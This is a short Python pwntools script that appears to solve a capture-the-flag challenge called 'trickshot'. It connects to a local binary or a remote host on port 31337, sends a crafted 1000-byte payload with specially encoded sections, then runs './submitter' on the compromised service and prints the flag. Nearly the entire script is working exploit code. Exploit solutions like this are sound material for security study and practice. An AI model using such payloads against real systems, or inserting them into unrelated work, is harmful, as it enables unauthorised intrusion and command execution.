#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def get_con():
    if args.LOCAL:
        p = process(["./trickshot"])
    else:
        p = remote(HOST, PORT)
    return p

p = get_con()

data = bytearray(cyclic(1000))

def setsection(new_data, index, bounces, offset=0):
    global data
    assert len(new_data) == 10
    new_data = bytearray(new_data)
    for i in range(len(new_data)):
        new_data[i] = (new_data[i] + bounces) & 0xff
    
    data[offset + index*10:offset + index*10+10] = new_data

data[0:10] = b"\x00\x00\x00\x00\x01\x00\x00\x00xx"
setsection(b"\x04fUzZ\xfftHiS", 1, 0)

setsection(b"\x80\xff\xff\xff\xff\x01\x00\x00\x00X", 57, 1)

setsection(b"\x10\x55\x55\x55\x55\x55\x55\x55\x55\x55", 18, 2)

setsection(b"\x40111111337", 20, 3)

p.sendlineafter([b"SHOW ME", b"trickshot..."], data)

time.sleep(1)
p.sendline("./submitter")

print(p.recvuntil(b"}"))
p.close()
